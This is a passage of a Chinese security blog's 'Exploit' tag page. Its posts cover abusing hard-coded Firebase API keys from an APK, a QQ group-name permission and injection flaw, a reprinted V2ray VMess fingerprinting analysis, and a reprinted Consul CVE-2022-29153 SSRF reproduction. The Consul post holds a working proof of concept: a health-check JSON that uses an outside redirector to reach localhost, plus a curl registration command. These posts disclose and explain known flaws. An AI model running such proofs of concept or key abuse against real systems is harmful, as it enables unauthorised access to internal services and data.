<p><img src="/2024/01/31/Firebase-API-Key-Hard-Coding/5.png" alt="image"></p>
</blockquote>
<h2><span id="api-key泄露">API Key泄露</span></h2><blockquote>
<p>直接上图，这些码应该够了吧：</p>
<p><img src="/2024/01/31/Firebase-API-Key-Hard-Coding/6.png" alt="image"></p>
<p>除了显而易见的<code>google_maps_key</code> 外，apk内还硬编码了<code>firebase_database_url</code>、<code>google_api_key</code>、<code>google_app_id</code>、<code>google_storage_bucket</code> 等敏感参数（有些是我直接获取源包找的），<code>firebase_database_url</code> 直接访问果然无权限，但是剩下的几个参数是怎么调用的？能获得什么信息呢？</p>
<p>首先猜测和存储空间有关，但不对，Google Cloud并不是用这样的参数类型请求访问的；那既然存在<code>firebase_database_url</code>，会不会和Firebase有关？一番文档翻找下，我大致了解了Firebase是啥，还有<a target="_blank" rel="noopener" href="https://firebase.google.com/docs/projects/manage-installations?hl=zh-cn">一部分的API调用</a>，并知道了相关的API Key是<a target="_blank" rel="noopener" href="https://console.cloud.google.com/apis/api/firebaseinstallations.googleapis.com/credentials?project=">在什么位置被生成</a>又用于何处的：</p>
<p><img src="/2024/01/31/Firebase-API-Key-Hard-Coding/7.png" alt="image"></p>
<p>之后要做的事情就简单了，构造一个请求，就可以获取到与Firebase服务器交互许可的凭证了：</p>
<p><img src="/2024/01/31/Firebase-API-Key-Hard-Coding/8.png" alt="image"></p>
<p>之后的操作就不做了，扩大影响面应该很容易，所以为什么要演奏春日……啊不对，为什么要把应用程序的报告暴露在公开检测平台！</p>
<p><img src="/2024/01/31/Firebase-API-Key-Hard-Coding/9.png" alt="image"></p>
</blockquote>
<h2><span id="参考引用">参考引用</span></h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://docs.genymotion.com/desktop/041_Deploying_an_app/#applications-for-arm">Deploy an application - Desktop User Guide</a></p>
<p><a target="_blank" rel="noopener" href="https://support.genymotion.com/hc/en-us/articles/360010853198-How-to-install-Xposed-EdXposed-LSPosed-Magisk-with-Genymotion-Desktop-">How to install Xposed&#x2F;EdXposed&#x2F;LSPosed + Magisk with Genymotion Desktop?</a></p>
<p><a target="_blank" rel="noopener" href="https://firebase.google.com/docs/projects/manage-installations?hl=zh-cn">管理 Firebase 安装</a></p>
<p><a target="_blank" rel="noopener" href="https://firebase.google.com/support/privacy/init-options?hl=zh-cn">排查初始化选项问题</a></p>
</blockquote>


        

        
            <div class="tags">
                <a class="tag-none-link" href="/tags/Chaos/" rel="tag">Chaos</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Hard-Coding/" rel="tag">Hard Coding</a><a class="tag-none-link" href="/tags/SRC/" rel="tag">SRC</a>
            </div>
        

    </section>
</article>
  
    <article class="post ">

    
        <h2 class="title">
            <a href="/2024/01/31/GroupName-QQ/">
                QQ群名称改动的一些小问题
            </a>
        </h2>
    
    <time>
        Jan 31, 2024
    </time>
    <section class="content">
        <h1><span id="qq群名称改动的一些小问题">QQ群名称改动的一些小问题</span></h1><p><img src="/2024/01/31/GroupName-QQ/1.png" alt="image"></p>
<h2><span id="写在前面">写在前面</span></h2><blockquote>
<p>别问我为啥最近更博客更这么勤，首先我得承认，确实新公司在我试用期的时候没有安排很多复杂的活给我干，虽然这样，但也不代表我每天能产出或者转载这么多文章，毕竟都是技术文章，都要自己看过理解再push上来的，每天有这么多时间吗？</p>
<p>前段时间没有，这段时间有了&#x3D; &#x3D;</p>
<p>因为临近年关，加上推进DLP和其他安全服务都阻塞在了钱上，导致最近我甚至能在Copy之于，写几篇这样的原创文章，分享下杂七杂八的技术来了。</p>
<p>但说实话，不论是转载来的文章还是自己原创的文章，都是比较久前接触到的知识了，也就是即使我是现在写出来的，接触我所描述的技术也是在大半年前甚至一年多前了（比如下文），每次写博客就是这样把旧东西重新捡拾的过程，有点像中学时期的错题本，常看常新，再看再新……</p>
<p>所以这不算是在工位上摸鱼哦，是增长技术积累，嗯，一定是这样。</p>
<p><img src="/2024/01/31/GroupName-QQ/2.png" alt="image"></p>
</blockquote>
<h2><span id="问题二则">问题二则</span></h2><h3><span id="其一讨论组的实现与群聊不同">其一：讨论组的实现与群聊不同</span></h3><blockquote>
<p>读者要说了：你这是废话</p>
<p>之前在QQ创建讨论组和创建群的方式就不一样，实现上不一致是很自然的事情，但是在作者写这篇文章的时候，QQ已经把“创建讨论组”这一功能下线了，所有的讨论组理论上也都自动转群了。</p>
<p><img src="/2024/01/31/GroupName-QQ/3.png" alt="image"></p>
<p>那么这个时候，讨论组转成的群和直接创建的群有什么差异吗？毕竟现在看起来一摸一样，转换后的群是重构了实现还是直接被套了个群外壳？</p>
</blockquote>
<h4><span id="任意群成员可修改群名">任意群成员可修改群名</span></h4><blockquote>
<p>在讨论组内，大家的权限划分是较为统一的，或者可以理解为没有做好权限划分，在转群后群成员仍被赋予了较高的权限，如：在只有一个群主的讨论组转群里，即便其他群成员不是管理员也可以随意修改群名（甚至可以扩展到其他信息）：</p>
<p><img src="/2024/01/31/GroupName-QQ/4.png" alt="image"></p>
<p><img src="/2024/01/31/GroupName-QQ/5.png" alt="image"></p>
<p><img src="/2024/01/31/GroupName-QQ/6.png" alt="image"></p>
<p><img src="/2024/01/31/GroupName-QQ/7.png" alt="image"></p>
<p>而对于直接创建的群来说，群名称是无法被任意群成员提交修改的：</p>
<p><img src="/2024/01/31/GroupName-QQ/8.png" alt="image"></p>
<p><img src="/2024/01/31/GroupName-QQ/9.png" alt="image"></p>
</blockquote>
<h3><span id="其二qq客户端群名称修改注入">其二：QQ客户端群名称修改注入</span></h3><blockquote>
<p>对于第一个问题，大家肯定会说这有啥，连个越权都算不上，利用不起来，顶多整蛊无辜群主，钓鱼诈骗都难利用起来，无意义，忽略了！（很像是SRC漏洞审核员会脱口而出的话呢）</p>
<p><img src="/2024/01/31/GroupName-QQ/10.png" alt="image"></p>
<p>那么，如果我顺着这个思路，触发一下客户端的注入，阁下又该如何应对？</p>
<p><img src="/2024/01/31/GroupName-QQ/11.png" alt="image"></p>
<p><img src="/2024/01/31/GroupName-QQ/12.png" alt="image"></p>
<p>首先可以看出QQ的客户端（包括TIM）在PC和移动端对群名称修改的实现不同：对于同一个POC，移动端将闭合字符后续的代码段全部解析，PC端收到POC的影响进行了三次群名称修改且名称不同，第一次修改可能也将闭合字符后续的代码段解析。</p>
<p>具体实现和步骤无，只是记录下自己发现的小问题，这个点能触发什么利用也在此不做讨论。</p>
<p><img src="/2024/01/31/GroupName-QQ/13.png" alt="image"></p>
</blockquote>


        

        
            <div class="tags">
                <a class="tag-none-link" href="/tags/Chaos/" rel="tag">Chaos</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/SRC/" rel="tag">SRC</a>
            </div>
        

    </section>
</article>
  
    <article class="post ">

    
        <h2 class="title">
            <a href="/2024/01/29/V2ray-Vulnerability/">
                V2ray协议爆发了重大安全漏洞
            </a>
        </h2>
    
    <time>
        Jan 29, 2024
    </time>
    <section class="content">
        <h1><span id="v2ray协议爆发了重大安全漏洞">V2ray协议爆发了重大安全漏洞</span></h1><blockquote>
<p>本文转自<a target="_blank" rel="noopener" href="https://dolorhunter.com/v2ray-protocol-security-vulnerability/">DolorHunter</a> 并作补充</p>
</blockquote>
<p><strong>服务器端的 V2ray 更新到 v4.23.4 以及之后的版本可以解决这一问题, 请大家尽快更新.</strong></p>
<blockquote>
<p>这可能是 V2ray 自 15 年发布 v1.0.0 以来面临的最大危机.</p>
<p>六一前后, 有大量网友反应自己的裸 V2ray 配置(Vmess+TCP 的默认配置)失效了, 我本来也没太当回事, 毕竟过几天就是 535 了, 断一断网是老传统, 并没有什么好说的. 不过有一点与以往不同, 这次被阻断的用户都是使用默认配置.</p>
<p>V2ray 的默认配置是 Vmess+TCP. 虽然中庸普通, 但它并不是一个容易被阻断的配置. 之前被阻断的 V2ray 配置通常都是些 KCP&#x2F;mKCP 或是 QUIC 这类的基于 UDP 协议的配置. UDP 通信数据特征明显, 因此容易被 GFW 逮个正着. 而 TCP 是可靠协议, 而且目前大量的网络数据也是基于 TCP 协议, 因此 TCP 协议一直都还算安全.</p>
<p>我的认知里Vmess协议有个安全性排名: Vmess+TCP&#x2F;WS&#x2F;HTTP2+TLS &gt; Vmess+TCP&#x2F;WS&#x2F;HTTP2 &gt; Vmess+KCP&#x2F;mKCP&#x2F;QUIC. 如果用白话来解释就是带TLS的配置是最高一档90分优秀, 中间配置60分及格凑合, 最后一档是不及格. 我一直认为, 只要不用 KCP&#x2F;mKCP&#x2F;QUIC 爆炸三兄弟, 还是能舒心上网的. 然而我的预判出了大错误.</p>
</blockquote>
<h2><span id="发现重大安全漏洞">发现重大安全漏洞</span></h2><blockquote>
<p>QV2ray-dev 社区首先发声. 六一当天, QV2ray-dev 警告用户不要使用 Vmess+TCP, 部分 Vmess+WS 及部分 Vmess+ws+TLS(insecure) 的配置组合. 他解释到 GFW 正在进行主动探测, 在 30s 内就可以接近 100% 的探测出你是否使用 Vmess+TCP 的配置, 其他配置亦可以受到波及. 并且此问题并无解决方案, 解决该问题可能需要重新设计 Vmess 协议.</p>
<p>看到了这条消息后, 当下到 V2ray 社区逛了一圈, 发现事态比想象中的严重许多. p4gefau1t 发了一个名为 <a target="_blank" rel="noopener" href="https://github.com/v2ray/discussion/issues/704">v2ray的TLS流量可被简单特征码匹配精准识别（附PoC)</a> 的帖子. 过后十几小时又发了个名为 <a target="_blank" rel="noopener" href="https://github.com/v2ray/v2ray-core/issues/2523">vmess协议设计和实现缺陷可导致服务器遭到主动探测特征识别(附PoC)</a> 的帖子. 这两个帖子在短短几小时内已经获得了数十个回复, 并且多为负责此项目的大牛.</p>
<p>p4gefau1t 首先发现仅凭tls client hello的cipher suite字段，就可以非常准确地将v2ray流量和正常浏览器流量区分开来。</p>
<p>他通过 <a target="_blank" rel="noopener" href="https://fr33land.net/2020/03/12/can-enable-tls-in-v2ray-help/">这篇文章</a> 中提到了使用机器学习训练的模型可对v2ray的tls+ws流量进行识别，准确率高达0.9999. 后来, 经过本地测试，可以复现。并且不限于tls+ws，对tls+vmess等组合也同样有效。其他tls流量如浏览器流量等，全程没有出现误报情况。因此初步怀疑是v2ray使用的utls进行client hello伪造出现的问题。</p>
<p>通过抓包对比真实的chrome与utls的client hello，发现两者基本一致，但与v2ray的存在较大差别，其中包括suite和extension的差别。此后，我们将utls的chrome的cipher suite patch到v2ray中后，此模型无法识别v2ray的tls流量。所以我们可以初步认为，模型很可能是学习了tls client hello的特征，导致流量被识别。</p>
<p>他发现识别tls client hello并不需要使用机器学习的方法，简单的DPI即可实现，因此在gfw部署的成本很低。并且，由于这组cipher suites太过特殊，我们可以仅凭cipher suites进行准确识别。</p>
<p>Cipher Suite 的特征有多特殊呢? 帖子下的网友随手撸一个从 0x90 偏移量开始的 memcmp 都能精准高效识别“特征码”：<code>cca8cca9c02fc02bc030c02cc027c013c023c009c014c00a130113031302</code> 甚至可以利用 iptables 进行明文匹配…… 帖内多个网友用其他配置也多次复现成功, 都得到了相同的特征码.</p>
<p>这个漏洞可以说是十分棘手. 几乎可以说只要 GFW 想, 随时可以全国断网, 并且不分配置(不管有没有 TLS 都是死路一条).</p>
<p>p4gefau1t 在十几个小时后又发了一个帖子. 这次他构造出了更具杀伤性的PoC, 仅需16次探测即可准确判定vmess服务，误报可能性几乎为0，校验的缓解措施均无效。唯一的解决方案是禁用vmess或者重新设计协议。</p>
<table>
<thead>
<tr>
<th>16 字节</th>
<th>X 字节</th>
<th>余下部分</th>
</tr>
</thead>
<tbody><tr>
<td>认证信息</td>
<td>指令部分</td>
<td>数据部分</td>
</tr>
</tbody></table>
<p>Vmess 协议前16字节为认证信息，内容为和时间、用户ID相关的散列值。根据协议设计，每个16字节的认证信息auth的有效期只有30秒。而问题出在指令部分。指令部分使用了没有认证能力的aes-cfb方式，因此攻击者可以篡改其中内容，而仍然能被服务器接受。</p>
<table>
<thead>
<tr>
<th>1 字节</th>
<th>16 字节</th>
<th>16 字节</th>
<th>1 字节</th>
<th>1 字节</th>
<th>4 位</th>
<th>4 位</th>
<th>1 字节</th>
<th>1 字节</th>
<th>2 字节</th>
<th>1 字节</th>
<th>N 字节</th>
<th>P 字节</th>
<th>4 字节</th>
</tr>
</thead>
<tbody><tr>
<td>版本号 Ver</td>
<td>数据加密 IV</td>
<td>数据加密 Key</td>
<td>响应认证 V</td>
<td>选项 Opt</td>
<td>余量 P</td>
<td>加密方式 Sec</td>
<td>保留</td>
<td>指令 Cmd</td>
<td>端口 Port</td>
<td>地址类型 T</td>
<td>地址 A</td>
<td>随机值</td>
<td>校验 F</td>
</tr>
</tbody></table>
<p>前16字节的认证信息可以被重复使用，并且只要通过认证，执行流即可进行到140行，初始化aes密钥流。接着在144行处，服务端在没有经过任何认证的情况下，读入38字节的密文，并使用aes-cfb进行解密，在没有进行任何校验的情况下，将其中版本号，余量P，加密方式等信息，直接填入结构体中。</p>
<p>这里问题已经很明显了，攻击者只需要得知16字节的认证信息，就可以在30秒内反复修改这38字节的信息进行反复的重放攻击&#x2F;密文填充攻击。</p>
<p>aes本身可以抵抗已知明文攻击，因此安全性方面基本没有问题。出现问题的是余量P。我猜想设计者应该是为了避免包的长度特征而引入这个字段，但是读入余量的方式出现了问题：在没有校验余量P、加密方式Sec、版本号Ver、指令 Cmd、地址类型T、地址A的情况下，将P直接代入ReadFullFrom中读取P字节（182行）。注意，这里P的范围是2^4&#x3D;16字节以内。读取P+4字节后，v2ray才会对前面读入的内容进行校验，判断命令部分是否合法。如果不合法，断开连接。</p>
</blockquote>
<h2><span id="临时性纾困方案">临时性纾困方案</span></h2><blockquote>
<p>V2ray 社区针对这一漏洞在一周内接连推出了两个小的版本更新, 4.23.3 和 4.23.4.</p>
<ul>
<li>v4.23.3 修复了 <a target="_blank" rel="noopener" href="https://github.com/v2ray/v2ray-core/issues/2523">vmess协议设计和实现缺陷可导致服务器遭到主动探测特征识别(附PoC)</a> 中的严重漏洞.</li>
<li>v4.23.4 进一步的修复了 Vmess 和 伪HTTP头的漏洞.</li>
</ul>
<p>V2Ray 项目在最近的几天内收到了数个隐匿性能方面的漏洞报告。这些漏洞都在被提出的数个小时内被解决（除 mKCP 修复暂缓）并发布相关更新。您可以升级到最新版本 v4.23.4 来获取最大程度的保护。我们支持和鼓励寻找并提出 V2Ray 各个方面漏洞的人。我们希望 V2Ray 的用户不要指责或者攻击为我们提供安全审计的人士。</p>
</blockquote>
<h3><span id="可以使用">可以使用</span></h3><blockquote>
<p>如果你已经升级到 V2Ray v4.23.4，并且没有开启 TLS 的 AllowInsecure 选项，以下配置组合不会泄露识别信息：</p>
<p>VMess over Websocket with TLS</p>
<p>VMess over TLS</p>
<p>VMess over HTTP&#x2F;2 （使用 TLS 的 HTTP&#x2F;2，并非 h2c）</p>
<p>Shadowsocks(AEAD) over Websocket with TLS</p>
</blockquote>
<h3><span id="谨慎使用">谨慎使用</span></h3><blockquote>
<p>以下配置组合可能会在攻击者位于网络路径上时可能会使攻击者获得的协议数据的一些统计学属性，但是这些信息不足以用于确定服务器上部署了这些协议</p>
<p><del>VMess over TCP （还在继续改进中）</del> 已修复, 可以正常使用</p>
</blockquote>
<h3><span id="并不建议">并不建议</span></h3><blockquote>
<p>以下配置组合不建议用于穿越被攻击者控制的网络：</p>
<p>任何协议 + SOCKS5</p>
<p>任何协议 + HTTP 代理</p>
<p>任何协议 + HTTP 伪装</p>
<p>任何协议 + mKCP + 任何伪装</p>
<p>-xiaokangwang 于 <a target="_blank" rel="noopener" href="https://github.com/v2ray/v2ray-core/issues/2542">关于在近期收到的数个漏洞的项目组公告</a></p>
</blockquote>
<h2><span id="协议的长期解决方案">协议的长期解决方案</span></h2><blockquote>
<p>重写 Vmess 协议可能是在较长时间内解决这一问题的唯一出路.</p>
<p>Vmess 协议已经诞生了很长一段时间. 那时候互联网上tls并不普及，tls1.3也还没出来。因此协议过时出现问题可以说是必然. 依照此趋势, 我倾向于认为下一代的 Vmess 默认协议可能会是类似 Vmess+TCP&#x2F;WS&#x2F;HTTP2+TLS 的设计. HTTP3 短期看来不太可能有具体应用, 毕竟 QUIC 作为 HTTP3的雏形, 翻车翻成什么样大家心里都有数.</p>
<p>这次可能可以说是 V2ray 面世五年来遇到的最大一次危机. 不过, 目前的两个紧急补丁已经缓解了燃眉之急, 并且就 V2ray 社区的效率(两天内连续两个补丁), 我基本上已经消解了我之前的随时可能断网的担忧了.</p>
<p>当前社区内对于新协议的讨论如火如荼, 每天都能看到新的点子冒出来. 过不了多久可能就会见到新的用于替换当前的 Vmess 的协议, 或者是目睹 V2ray 终于要进入 v5.0.0时代. 不论是目睹了其中的任何一件, 都是在见证历史, 见证开源社区的协作, 见证又一次与 GFW 的缠斗.</p>
</blockquote>


        

        
            <div class="tags">
                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Proxy/" rel="tag">Proxy</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/V2ray/" rel="tag">V2ray</a>
            </div>
        

    </section>
</article>
  
    <article class="post ">

    
        <h2 class="title">
            <a href="/2024/01/29/CVE-2022-29153-Consul/">
                CVE-2022-29153 consul SSRF
            </a>
        </h2>
    
    <time>
        Jan 29, 2024
    </time>
    <section class="content">
        <h1><span id="cve-2022-29153-consul-ssrf">CVE-2022-29153 consul SSRF</span></h1><blockquote>
<p>本文转自<a target="_blank" rel="noopener" href="https://github.com/cokeBeer/go-cves/blob/main/CVE-2022-29153/CVE-2022-29153.md">cokeBeer</a> 并作补充</p>
</blockquote>
<h2><span id="漏洞信息">漏洞信息</span></h2><blockquote>
<ul>
<li>漏洞类型：SSRF</li>
<li>漏洞版本：&lt; 1.9.17，&gt;&#x3D; 1.10.0, &lt; 1.10.10，&gt;&#x3D; 1.11.0, &lt; 1.11.5</li>
<li>漏洞简介：http类型的health_check被重定向导致的SSRF</li>
</ul>
</blockquote>
<h2><span id="repo介绍">repo介绍</span></h2><blockquote>
<p>consul是一个用go语言编写的分布式应用管理服务器，目前在github上已经有24.7k个star</p>
</blockquote>
<h2><span id="漏洞分析">漏洞分析</span></h2><blockquote>
<p>consul提供了对于服务的health_check能力。首先安装一个漏洞版本的consul</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://apt.releases.hashicorp.com/gpg | sudo apt-key add -</span><br><span class="line">sudo apt-add-repository <span class="string">&quot;deb [arch=amd64] https://apt.releases.hashicorp.com <span class="subst">$(lsb_release -cs)</span> main&quot;</span></span><br><span class="line">sudo apt-get update &amp;&amp; sudo apt-get install consul=1.10.9</span><br></pre></td></tr></table></figure>

<p>然后启动一个consul服务器</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">consul agent -dev -enable-script-checks -node=web -ui</span><br></pre></td></tr></table></figure>

<p>访问<code>http://localhost:8500/</code>可以看到consul的界面</p>
<p><img src="/2024/01/29/CVE-2022-29153-Consul/1.png" alt="image"></p>
<p>编写一个<code>ssrf.json</code>作为poc，里面标志的http地址会将请求302重定向到<code>127.0.0.1:80</code></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;ID&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ssrf&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ssrf&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;port&quot;</span><span class="punctuation">:</span> <span class="number">5001</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;check&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;checkid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ssrf_check&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Check ssrf&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;http&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://fuzz.red/ssrf/127.0.0.1/&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;method&quot;</span><span class="punctuation">:</span> <span class="string">&quot;GET&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;interval&quot;</span><span class="punctuation">:</span> <span class="string">&quot;10s&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;timeout&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1s&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>使用如下指令将<code>health_check</code>注册到consul服务器</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --request PUT --data @ssrf.json http://127.0.0.1:8500/v1/agent/service/register</span><br></pre></td></tr></table></figure>

<p>可以看到添加成功</p>
<p><img src="/2024/01/29/CVE-2022-29153-Consul/2.png" alt="image"></p>
<p>这时consul会主动运行<code>health_check</code>，请求被302重定向到内网，导致了SSRF。可以看到nc也收到了请求</p>
<p><img src="/2024/01/29/CVE-2022-29153-Consul/3.png" alt="image"></p>
</blockquote>
<h2><span id="修复方式">修复方式</span></h2><blockquote>
<p>在<a target="_blank" rel="noopener" href="https://github.com/hashicorp/consul/blob/928fefd2a7ee5ae8d90377514ec2022ee9730be0/agent/config/config.go#L391">agent&#x2F;config.go</a>中添<code>加DisableRedirects</code>字段，可以在服务器端配置，关闭<code>health_check</code>的重定向</p>
<p><img src="/2024/01/29/CVE-2022-29153-Consul/4.png" alt="image"></p>
</blockquote>
<h2><span id="参考链接">参考链接</span></h2><blockquote>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/advisories/GHSA-q6h7-4qgw-2j9p">https://github.com/advisories/GHSA-q6h7-4qgw-2j9p</a></li>
</ul>
</blockquote>


        

        
            <div class="tags">
                <a class="tag-none-link" href="/tags/Consul/" rel="tag">Consul</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/SSRF/" rel="tag">SSRF</a>
            </div>
        

    </section>
</article>
  
</section>


  <nav id="page-nav" class="clearfix">
    
    
    <a class="next" rel="next" href="/tags/Exploit/page/2/">
      <span class="text">Next</span>
      <span class="icon icon-chevron-right"></span>
    </a>
    
  </nav>

        <script>setLoadingBarProgress(60);</script>
    </main>

    <footer id="footer" class="clearfix">

    

    <div class="social-wrapper">
        
            
                <a href="https://github.com/szczecin" class="social github"
                   target="_blank" rel="external">
                    <span class="icon icon-github"></span>
                </a>
            
                <a href="/atom.xml" class="social rss"
                   target="_blank" rel="external">
                    <span class="icon icon-rss"></span>
                </a>
            
        
    </div>

    <div class="theme-by">Theme <span class="codename">Memory</span> designed by <a href="https://artifact.me/"
                                                                                    target="_blank">Art Chen</a>.
    </div>
    <div>&copy; <a href="/">氕氘氚</a></div>

</footer>


    <script>setLoadingBarProgress(80);</script>
    <div class="overlay"></div>
</div>

<div class="site-sidebar" id="site-sidebar">

    

    <div class="sidebar-switch clearfix "
         style="display: none">
        <a class="dark-btn active" data-toggle="toc">
            <span class="icon icon-list"></span>
            <span class="text">Index</span>
        </a>
        <a class="dark-btn" data-toggle="bio">
            <span class="icon icon-person"></span>
            <span class="text">Bio</span>
        </a>
    </div>

    <div class="site-toc "
         style="display: none">
        
            <div class="no-index">No Index</div>
        
    </div>

    <div class="site-bio show"
         style="display: block">

        <div class="about-me clearfix">
            <div class="avatar">
                <img src="/img/avatar.png"/>
            </div>
            <div class="info">
                <a class="name dark-btn" href="/about">
                    Szczecin
                </a>
            </div>
            <div class="info">
                <span class="item desc">
                    Open your eyes to see the light in life
                </span>
            </div>
        </div>

        <div class="menu section">
            <ul class="clearfix">
                
                    <li class="left">
                        <a href="/about"
                           onfocus="this.blur();"
                           class="nav-about dark-btn block">
                            简介
                        </a>
                    </li>
                
                    <li class="right">
                        <a href="/archives"
                           onfocus="this.blur();"
                           class="nav-archives dark-btn block">
                            归档
                        </a>
                    </li>
                
                    <li class="left">
                        <a href="/categories"
                           onfocus="this.blur();"
                           class="nav-categories dark-btn block">
                            分类
                        </a>
                    </li>
                
                    <li class="right">
                        <a href="/tags"
                           onfocus="this.blur();"
                           class="nav-tags dark-btn block">
                            TAGs
                        </a>
                    </li>
                
                    <li class="left">
                        <a href="/WriteUP"
                           onfocus="this.blur();"
                           class="nav-WriteUP dark-btn block">
                            WriteUP
                        </a>
                    </li>
                
                    <li class="right">
                        <a href="/EXP"
                           onfocus="this.blur();"
                           class="nav-EXP dark-btn block">
                            EXP
                        </a>
                    </li>
                
                    <li class="left">
                        <a href="/tags/SRC"
                           onfocus="this.blur();"
                           class="nav-SRC dark-btn block">
                            SRC
                        </a>
                    </li>
                
                    <li class="right">
                        <a href="/Life"
                           onfocus="this.blur();"
                           class="nav-Life dark-btn block">
                            Life
                        </a>
                    </li>
                
            </ul>
        </div>

    </div>

    <div class="shortcuts">
        <a href="#header" class="top window-nav dark-btn" id="go-top">
            <span class="icon icon-chevron-thin-up"></span>
        </a>
        <a class="close dark-btn" id="sidebar-close">
            <span class="icon icon-close"></span>
        </a>
        <a href="#footer" class="top window-nav dark-btn" id="go-bottom">
            <span class="icon icon-chevron-thin-down"></span>
        </a>
    </div>

</div>





<script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
<script>window.jQuery || document.write('<script src="/js/jquery.min.js"><\/script>')</script>


<script src="/js/jquery.fitvids.js"></script>

<script>
  var GOOGLE_CUSTOM_SEARCH_API_KEY = "";
  var GOOGLE_CUSTOM_SEARCH_ENGINE_ID = "";
  var ALGOLIA_API_KEY = "";
  var ALGOLIA_APP_ID = "";
  var ALGOLIA_INDEX_NAME = "";
  var AZURE_SERVICE_NAME = "";
  var AZURE_INDEX_NAME = "";
  var AZURE_QUERY_KEY = "";
  var SEARCH_SERVICE = "";
  var universalSearchConfig = {};
  if (SEARCH_SERVICE === 'google') {
    universalSearchConfig = {
      searchService: SEARCH_SERVICE,
      apiKey: GOOGLE_CUSTOM_SEARCH_API_KEY,
      engineId: GOOGLE_CUSTOM_SEARCH_ENGINE_ID,
      imagePath: "/img/"
    };
  } else if (SEARCH_SERVICE === 'algolia') {
    universalSearchConfig = {
      searchService: SEARCH_SERVICE,
      apiKey: ALGOLIA_API_KEY,
      appId: ALGOLIA_APP_ID,
      indexName: ALGOLIA_INDEX_NAME,
      imagePath: "/img/"
    };
  } else if (SEARCH_SERVICE === 'azure') {
    universalSearchConfig = {
      searchService: SEARCH_SERVICE,
      serviceName: AZURE_SERVICE_NAME,
      indexName: AZURE_INDEX_NAME,
      apiKey: AZURE_QUERY_KEY,
      imagePath: "/img/"
    };
  }
</script>

<script src="/js/app.js"></script>


<script src="/js/search.js"></script>





<script>setLoadingBarProgress(100);</script>

</body>
</html>
